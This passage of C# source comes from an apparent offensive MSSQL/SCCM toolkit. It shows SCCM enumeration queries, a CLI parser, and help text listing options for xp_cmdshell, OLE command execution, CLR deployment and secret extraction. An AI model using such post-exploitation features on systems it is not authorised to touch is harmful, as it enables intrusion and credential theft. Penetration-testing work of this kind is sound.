        a.NotifyUser,
        a.AllowUsers,
        a.StartTime,
        c.Name AS CollectionName
    FROM 
        v_Advertisement a
        INNER JOIN v_Package p ON a.PackageID = p.PackageID
        INNER JOIN v_Collection c ON a.CollectionID = c.CollectionID
    ORDER BY 
        a.StartTime DESC";

            try
            {
                var results = await ExecuteQueryReturnTable(conn, query);
                if (results.Count == 0)
                {
                    Console.WriteLine("[!] No deployments found");
                    return;
                }

                PrintTable(results);


                if (results.Count > 0)
                {
                    string packageId = results[0]["PackageID"].ToString();
                    Console.WriteLine($"\n[+] Showing status for deployment: {results[0]["PackageName"]} ({packageId})");

                    string statusQuery = $@"
            SELECT 
                stat.StateName,
                COUNT(*) AS Count
            FROM 
                v_FullCollectionMembership fcm
                INNER JOIN v_R_System sys ON fcm.ResourceID = sys.ResourceID
                INNER JOIN vSMS_StatusMessageIns tw ON sys.Netbios_Name0 = tw.MachineName
                INNER JOIN v_StateNames stat ON tw.MessageType = stat.StateID
            WHERE 
                tw.PackageID = '{packageId}'
            GROUP BY 
                stat.StateName";

                    var statusResults = await ExecuteQueryReturnTable(conn, statusQuery);
                    PrintTable(statusResults);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error retrieving SCCM deployments: {ex.Message}");
            }
        }

        static async Task ShowSccmClients(SqlConnection conn, string filter = null)
        {
            if (!await IsSccmDatabase(conn))
            {
                Console.WriteLine("[-] Not connected to an SCCM database");
                return;
            }

            Console.WriteLine("[*] Listing SCCM clients...");

            string query = @"
    SELECT TOP 50
        Netbios_Name0 AS Hostname,
        User_Name0 AS Username,
        Client_Version0 AS ClientVersion,
        DATEDIFF(day, AgentTime, GETDATE()) AS DaysSinceContact,
        IP_Addresses0 AS IPAddress
    FROM 
        v_CH_ClientSummary
    WHERE 
        ClientActiveStatus = 1";

            if (!string.IsNullOrEmpty(filter))
            {
                if (filter.Equals("inactive", StringComparison.OrdinalIgnoreCase))
                {
                    query = query.Replace("ClientActiveStatus = 1", "ClientActiveStatus = 0");
                }
                else if (filter.StartsWith("days>"))
                {
                    int days;
                    if (int.TryParse(filter.Substring(5), out days))
                    {
                        query += $" AND DATEDIFF(day, AgentTime, GETDATE()) > {days}";
                    }
                }
                else
                {
                    query += $" AND (Netbios_Name0 LIKE '%{filter.Replace("'", "''")}%' OR User_Name0 LIKE '%{filter.Replace("'", "''")}%')";
                }
            }

            query += " ORDER BY DaysSinceContact DESC, Hostname";

            try
            {
                var results = await ExecuteQueryReturnTable(conn, query);
                PrintTable(results);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error retrieving SCCM clients: {ex.Message}");
            }
        }

        static async Task ShowSccmApplicationDetails(SqlConnection conn, string appName)
        {
            if (!await IsSccmDatabase(conn))
            {
                Console.WriteLine("[-] Not connected to an SCCM database");
                return;
            }

            Console.WriteLine($"[*] Showing details for application: {appName}");


            string appQuery = $@"
    SELECT 
        CI_ID AS ID,
        DisplayName AS Name,
        Description,
        SoftwareVersion AS Version,
        Publisher
    FROM 
        fn_ListLatestApplicationCIs(1033)
    WHERE 
        DisplayName LIKE '%{appName.Replace("'", "''")}%' OR 
        CI_UniqueID LIKE '%{appName.Replace("'", "''")}%'
    ORDER BY 
        DisplayName";

            try
            {
                var apps = await ExecuteQueryReturnTable(conn, appQuery);
                if (apps.Count == 0)
                {
                    Console.WriteLine($"[-] No applications found matching '{appName}'");
                    return;
                }

                PrintTable(apps);


                string appId = apps[0]["ID"].ToString();
                Console.WriteLine($"\n[+] Showing deployment details for: {apps[0]["Name"]}");

                string deploymentQuery = $@"
        SELECT 
            a.AppModelName,
            c.Name AS CollectionName,
            d.DesiredConfigType,
            d.DeploymentTime,
            d.EnforcementDeadline
        FROM 
            v_ApplicationAssignment a
            INNER JOIN v_Collection c ON a.CollectionID = c.CollectionID
            INNER JOIN v_DeploymentInfo d ON a.AssignmentID = d.AssignmentID
        WHERE 
            a.ModelID = {appId}
        ORDER BY 
            DeploymentTime DESC";

                var deployments = await ExecuteQueryReturnTable(conn, deploymentQuery);
                if (deployments.Count > 0)
                {
                    Console.WriteLine("\n[+] Application Deployments:");
                    PrintTable(deployments);
                }


                string contentQuery = $@"
        SELECT 
            ldp.ServerNALPath AS DistributionPoint,
            ldp.SiteCode,
            p.PackageID,
            p.Name AS PackageName
        FROM 
            v_CISettings cs
            INNER JOIN v_CIPackages cp ON cs.CI_ID = cp.CI_ID
            INNER JOIN v_Package p ON cp.PackageID = p.PackageID
            INNER JOIN v_DistributionPoints ldp ON p.PackageID = ldp.PackageID
        WHERE 
            cs.CI_ID = {appId}";

                var content = await ExecuteQueryReturnTable(conn, contentQuery);
                if (content.Count > 0)
                {
                    Console.WriteLine("\n[+] Distribution Points:");
                    PrintTable(content);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error retrieving SCCM application details: {ex.Message}");
            }
        }

        static async Task SccmAudit(SqlConnection conn)
        {
            if (!await IsSccmDatabase(conn))
            {
                Console.WriteLine("[-] Not connected to an SCCM database");
                return;
            }

            Console.WriteLine("[*] Performing SCCM security audit...");


            string highPermDeployments = @"
    SELECT 
        a.PackageID,
        p.Name AS PackageName,
        a.ProgramName,
        a.Required,
        a.OfferTypeID,
        a.NotifyUser,
        a.AllowUsers
    FROM 
        v_Advertisement a
        INNER JOIN v_Package p ON a.PackageID = p.PackageID
    WHERE 
        a.AllowUsers = 1 OR a.OfferTypeID = 2 -- Required assignment
    ORDER BY 
        a.Required DESC, p.Name";


            string mwCollections = @"
    SELECT 
        c.Name AS CollectionName,
        mw.StartTime,
        mw.Duration,
        mw.Description
    FROM 
        v_Collection c
        INNER JOIN v_CollectionSettings cs ON c.CollectionID = cs.CollectionID
        INNER JOIN v_MaintenanceWindow mw ON cs.SettingsID = mw.SettingsID
    ORDER BY 
        c.Name";


            string obsoleteClients = @"
    SELECT 
        Netbios_Name0 AS Hostname,
        DATEDIFF(day, AgentTime, GETDATE()) AS DaysSinceContact
    FROM 
        v_CH_ClientSummary
    WHERE 
        DATEDIFF(day, AgentTime, GETDATE()) > 30
    ORDER BY 
        DaysSinceContact DESC";


            string adminQuery = @"
    SELECT 
        ssa.SecuredScopeName,
        sgm.WindowsGroupName AS UserName,
        sgm.IsLocal,
        sgm.IsADGroup
    FROM 
        v_SecuredScopes ssa
        INNER JOIN v_SecuredScopePermissions ssp ON ssa.SecuredScopeID = ssp.SecuredScopeID
        INNER JOIN v_SecuredGroupMembers sgm ON ssp.SecuredGroupID = sgm.SecuredGroupID
    ORDER BY 
        ssa.SecuredScopeName, sgm.WindowsGroupName";


            string noMwQuery = @"
    SELECT 
        COUNT(*) AS Count
    FROM 
        v_Collection
    WHERE 
        CollectionID NOT IN (
            SELECT CollectionID FROM v_CollectionSettings
        )";


            string adminDeployQuery = @"
    SELECT 
        COUNT(*) 
    FROM 
        v_Advertisement 
    WHERE 
        RunType = 2";  

            try
            {
                Console.WriteLine("\n[+] Deployments with elevated permissions:");
                var highPermResults = await ExecuteQueryReturnTable(conn, highPermDeployments);
                PrintTable(highPermResults);

                Console.WriteLine("\n[+] Collections with maintenance windows:");
                var mwResults = await ExecuteQueryReturnTable(conn, mwCollections);
                PrintTable(mwResults);

                Console.WriteLine("\n[+] Obsolete clients (no contact for >30 days):");
                var obsoleteResults = await ExecuteQueryReturnTable(conn, obsoleteClients);
                PrintTable(obsoleteResults);

                Console.WriteLine("\n[+] SCCM Administrative Users:");
                var adminResults = await ExecuteQueryReturnTable(conn, adminQuery);
                PrintTable(adminResults);


                var noMwResults = await ExecuteQueryReturnTable(conn, noMwQuery);
                int noMwCount = noMwResults.Count > 0 && noMwResults[0].ContainsKey("Count") ?
                    Convert.ToInt32(noMwResults[0]["Count"]) : 0;
                Console.WriteLine($"\nCollections without maintenance windows: {(noMwCount > 10 ? "WARNING" : "OK")} - {noMwCount}");


                var adminDeployResults = await ExecuteQueryReturnTable(conn, adminDeployQuery);
                int adminDeployCount = adminDeployResults.Count > 0 && adminDeployResults[0].ContainsKey("Count") ?
                    Convert.ToInt32(adminDeployResults[0]["Count"]) : 0;
                Console.WriteLine($"Deployments requiring admin rights: {(adminDeployCount > 5 ? "WARNING" : "OK")} - {adminDeployCount}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error during SCCM audit: {ex.Message}");
            }
        }
        #endregion
        #region Helpers & CLI
        static string ExtractHostFromDataSource(string ds)
        {
            if (ds.StartsWith("tcp:", StringComparison.OrdinalIgnoreCase)) ds = ds.Substring(4);
            var slash = ds.IndexOf('\\');
            if (slash >= 0) ds = ds.Substring(0, slash);
            var comma = ds.IndexOf(',');
            if (comma >= 0) ds = ds.Substring(0, comma);
            return ds;
        }
        static string[] SplitN(string s, char sep, int n)
        {
            var parts = new List<string>();
            int idx = 0;
            while (parts.Count < n - 1)
            {
                var p = s.IndexOf(sep, idx);
                if (p == -1) break;
                parts.Add(s.Substring(idx, p - idx));
                idx = p + 1;
            }
            parts.Add(s.Substring(idx));
            return parts.ToArray();
        }
        class Config
        {
            public string Server;
            public string ServerHostOnly;
            public string User;
            public string Password;
            public string Domain;
            public string Database;
            public bool UseIntegrated = false;
            public bool UseKerberos = false;
            public bool SpnCheck = false;
            public bool SpnOnly = false;
            public bool Encrypt = false;
            public bool TrustServerCert = false;
            public int Timeout = 15;
            public string RunFile;
            public string RunCommand;
            public bool ShowHelp = false;
            public bool SccmInventory = false;
            public bool SccmCollections = false;
            public bool SccmDeployments = false;
            public bool SccmClients = false;
            public bool SccmAudit = false;
            public string SccmCollectionFilter = null;
            public string SccmClientFilter = null;
            public bool GetInstance { get; set; } = false;
            public string ExportCsv;
            public string ExportJson;
            public string LogFile;
            public bool UseRunas = false;
            public string RunasUser;
            public string RunasPassword;
            public bool ListDatabases = false;
            public bool ListTables = false;
            public string TablesDatabase = null;
            public bool TablesIncludeSystem = false;
            public bool ListColumns = false;
            public string ColumnsTable = null;
            public string ColumnsSchema = "dbo";
            public string ColumnsDatabase = null;
            public bool ListUsers = false;
            public bool ListPermissions = false;
            public bool SecurityAudit = false;
            public bool SearchSecrets = false;
            public string SearchTerm = "password";
            public bool ListSecrets = false;
            public bool ListServices = false;
            public bool ListLinkedServers = false;

            public bool HasCredentialPair => !string.IsNullOrEmpty(User) && !string.IsNullOrEmpty(Password);
            public bool EnableOle = false;
            public string OleCommand = null;
            public bool DisableOle = false;
            public bool EnableXpCmdShell = false;
            public bool DisableXpCmdShell = false;
            public bool EnableClr = false;
            public bool DisableClr = false;
            public string ClrAssemblyPath = null;
            public bool ShowInfo = false;
        }
        static class CLI
        {
            public static Config Parse(string[] args)
            {
                var c = new Config();
                for (int i = 0; i < args.Length; i++)
                {
                    var a = args[i];
                    switch (a)
                    {
                        case "-h":
                        case "--help": c.ShowHelp = true; break;
                        case "--server": c.Server = Next(args, ref i, a); break;
                        case "--server-host": c.ServerHostOnly = Next(args, ref i, a); break;
                        case "--user": c.User = Next(args, ref i, a); break;
                        case "--pass": c.Password = Next(args, ref i, a); break;
                        case "--domain": c.Domain = Next(args, ref i, a); break;
                        case "--db": c.Database = Next(args, ref i, a); break;
                        case "--integrated": c.UseIntegrated = true; break;
                        case "--kerberos": c.UseKerberos = true; break;
                        case "--runas":
                            c.UseRunas = true;
                            c.RunasUser = Next(args, ref i, a);
                             c.UseKerberos = false;
                            break;
                        case "--runas-pass":
                            c.RunasPassword = Next(args, ref i, a);
                            break;
                        case "--getinstance":
                            c.GetInstance = true;
                            break;
                        case "--spn-check": c.SpnCheck = true; break;
                        case "--spn-only": c.SpnOnly = true; break;
                        case "--encrypt": c.Encrypt = true; break;
                        case "--trust-server-cert": c.TrustServerCert = true; break;
                        case "--timeout": c.Timeout = int.Parse(Next(args, ref i, a)); break;
                        case "--run-file": c.RunFile = Next(args, ref i, a); break;
                        case "--run-cmd": c.RunCommand = Next(args, ref i, a); break;
                        case "--export-csv": c.ExportCsv = Next(args, ref i, a); break;
                        case "--export-json": c.ExportJson = Next(args, ref i, a); break;
                        case "--log": c.LogFile = Next(args, ref i, a); break;
                        case "--enable-ole": c.EnableOle = true; break;
                        case "--ole-cmd": c.OleCommand = Next(args, ref i, a); break;
                        case "--disable-ole": c.DisableOle = true; break;
                        case "--enable-xp-cmdshell": c.EnableXpCmdShell = true; break;
                        case "--disable-xp-cmdshell": c.DisableXpCmdShell = true; break;
                        case "--enable-clr": c.EnableClr = true; break;
                        case "--disable-clr": c.DisableClr = true; break;
                        case "--deploy-clr": c.ClrAssemblyPath = Next(args, ref i, a); break;
                        case "--info": c.ShowInfo = true; break;

                        case "--sccm-inventory": c.SccmInventory = true; break;
                        case "--sccm-collections":
                            c.SccmCollections = true;
                            if (i + 1 < args.Length && !args[i + 1].StartsWith("--"))
                                c.SccmCollectionFilter = Next(args, ref i, a);
                            break;
                        case "--sccm-deployments": c.SccmDeployments = true; break;
                        case "--sccm-clients":
                            c.SccmClients = true;
                            if (i + 1 < args.Length && !args[i + 1].StartsWith("--"))
                                c.SccmClientFilter = Next(args, ref i, a);
                            break;
                        case "--sccm-audit": c.SccmAudit = true; break;
                        case "--list-dbs":
                        case "--dbs":
                            c.ListDatabases = true;
                            break;
                        case "--list-tables":
                            c.ListTables = true;

                            if (i + 1 < args.Length && !args[i + 1].StartsWith("--"))
                                c.TablesDatabase = Next(args, ref i, a);
                            break;
                        case "--list-tables-all":
                            c.ListTables = true;
                            c.TablesIncludeSystem = true;

                            if (i + 1 < args.Length && !args[i + 1].StartsWith("--"))
                                c.TablesDatabase = Next(args, ref i, a);
                            break;
                        case "--list-columns":
                            c.ListColumns = true;
                            c.ColumnsTable = Next(args, ref i, a);
                            if (i + 1 < args.Length && !args[i + 1].StartsWith("--"))
                                c.ColumnsSchema = Next(args, ref i, a);
                            if (i + 1 < args.Length && !args[i + 1].StartsWith("--"))
                                c.ColumnsDatabase = Next(args, ref i, a);
                            break;
                        case "--list-users":
                        case "--users":
                            c.ListUsers = true;
                            break;
                        case "--list-perms":
                        case "--perms":
                            c.ListPermissions = true;
                            break;
                        case "--security-audit":
                        case "--audit":
                            c.SecurityAudit = true;
                            break;
                        case "--search-secrets":
                            c.SearchSecrets = true;
                            c.SearchTerm = Next(args, ref i, a);
                            break;
                        case "--list-secrets":
                        case "--secrets":
                            c.ListSecrets = true;
                            break;
                        case "--list-services":
                        case "--services":
                            c.ListServices = true;
                            break;
                        case "--list-linkservers":
                            c.ListLinkedServers = true;
                            break;
                        default:
                            if (c.Server == null) c.Server = a; break;
                    }
                }
                if (c.UseIntegrated && !c.UseKerberos) c.UseKerberos = true;
                return c;
            }
            static string Next(string[] args, ref int i, string opt)
            {
                i++;
                if (i >= args.Length) throw new ArgumentException($"Missing value for {opt}");
                return args[i];
            }
            public static void PrintHelp()
            {
                Console.WriteLine(@"
            _       _           _      
           | |     (_)         | |     
  ___  ____| |_ _ _ _ ____   _ | | ___ 
 /___)/ _  | | | | | |  _ \ / || |/___)
|___ | | | | | | | | | | | ( (_| |___ |
(___/ \_|| |_|\____|_|_| |_|\____(___/ 
         |_|  

  [ SQL Security Assessment & Post-Exploitation Toolkit ]
             Version 1.0 | @blue0x1 | 2025
");

                Console.WriteLine("SQLWinds.exe --server <server[:port][\\instance]> [options]");
                Console.WriteLine();
                Console.WriteLine("Options:");
                Console.WriteLine("  --server <server>            Server name or IP (positional allowed).");
                Console.WriteLine("  --server-host <host>         Optional host-only used for SPN checks (overrides host extraction)");
                Console.WriteLine("  --user <username>            SQL or Windows username.");
                Console.WriteLine("  --pass <password>            Password for the specified user.");
                Console.WriteLine("  --domain <domain>            Domain for Windows credentials (default: current).");
                Console.WriteLine("  --db <database>              Database to connect to (default: master).");

                Console.WriteLine("  --integrated                 Use Windows Integrated Authentication (current user).");
                Console.WriteLine("  --kerberos                   Use Kerberos flow (Impersonate when --user/--pass provided).");
                Console.WriteLine("  --runas <username>  Run as specified user (for localhost connections)");
                Console.WriteLine("  --runas-pass <pass> Password for runas user");
                Console.WriteLine("  --spn-check                  Query AD for MSSQLSvc SPNs for the target host.");
                Console.WriteLine("  --spn-only                   Run SPN check and exit (use with --spn-check).");
                Console.WriteLine("  --encrypt                    Require TLS/SSL encryption for connection.");
                Console.WriteLine("  --trust-server-cert          Trust the server certificate (skip CA validation).");
                Console.WriteLine("  --timeout <seconds>          Connection timeout (default 15).");
                Console.WriteLine("  --run-file <file.sql>        Execute SQL script file and exit.");
                Console.WriteLine("  --run-cmd \"<SQL>\"           Execute single SQL query and print results.");
                Console.WriteLine("  --export-csv <path>          Save one-shot query to CSV.");
                Console.WriteLine("  --export-json <path>         Save one-shot query to JSON.");
                Console.WriteLine("  --enable-ole                 Enable OLE Automation Procedures (requires sysadmin)");
                Console.WriteLine("  --ole-cmd \"<command>\"       Execute OS command using OLE Automation");
                Console.WriteLine("  --disable-ole                Disable OLE Automation Procedures");
                Console.WriteLine("  --enable-xp-cmdshell         Enable xp_cmdshell (requires sysadmin)");
                Console.WriteLine("  --disable-xp-cmdshell        Disable xp_cmdshell");
                Console.WriteLine("  --enable-clr                 Enable CLR integration (requires sysadmin)");
                Console.WriteLine("  --disable-clr                Disable CLR integration");
                Console.WriteLine("  --deploy-clr <path>          Deploy CLR assembly");
                Console.WriteLine("  --info                       Show detailed server information");
                Console.WriteLine("  --getinstance            Discover SQL Server instances in the domain");
                Console.WriteLine("  --list-dbs                List all databases with details");
                Console.WriteLine("  --list-tables [db]        List tables in specified database");
                Console.WriteLine("                           *For system databases (master, msdb, model, tempdb),");
                Console.WriteLine("                            this automatically includes system tables*");
                Console.WriteLine("  --list-tables-all [db]    List all tables (including system tables in user databases)");
                Console.WriteLine("  --list-columns <table>    List columns for specified table");
                Console.WriteLine("                           [schema] [database]");
                Console.WriteLine("  --list-users              List all SQL logins and database users");
                Console.WriteLine("  --list-perms              Show current user permissions");
                Console.WriteLine("  --security-audit          Perform security configuration audit");
                Console.WriteLine("  --search-secrets <term>   Search for sensitive data (default: password)");
                Console.WriteLine("  --list-secrets            Extract potential secrets from database");
                Console.WriteLine("  --list-services           Show SQL Server service accounts");
                Console.WriteLine("  --list-linkservers        List linked servers with detailed info");
                Console.WriteLine(" --sccm-inventory Show SCCM hardware/software inventory");
                Console.WriteLine(" --sccm-collections [filter] List SCCM collections (optional filter)");
                Console.WriteLine(" --sccm-deployments Show software deployments");
                Console.WriteLine(" --sccm-clients [filter] Show SCCM clients (optional filter)");
                Console.WriteLine(" --sccm-audit Perform SCCM security audit");
                Console.WriteLine("  --log <logfile>              Write operational log to file.");
                Console.WriteLine("  -h, --help                   Show this help.");
                Console.WriteLine();
                Console.WriteLine("Examples:");
                Console.WriteLine("  SQLWinds.exe --server sql01.corp.local --kerberos --user alice --pass 'Secret' --spn-check --encrypt");
                Console.WriteLine("  SQLWinds.exe 10.0.0.5\\SQLEXPRESS --user sa --pass 'P@ss' --run-cmd \"SELECT name FROM sys.databases\"");
                Console.WriteLine();
                Console.WriteLine("Inside REPL, use ':spn', ':enable_xp_cmdshell', ':xp <cmd>', ':upload', ':download', ':exportcsv', ':exportjson'.");
            }
        }
        #endregion
    }
}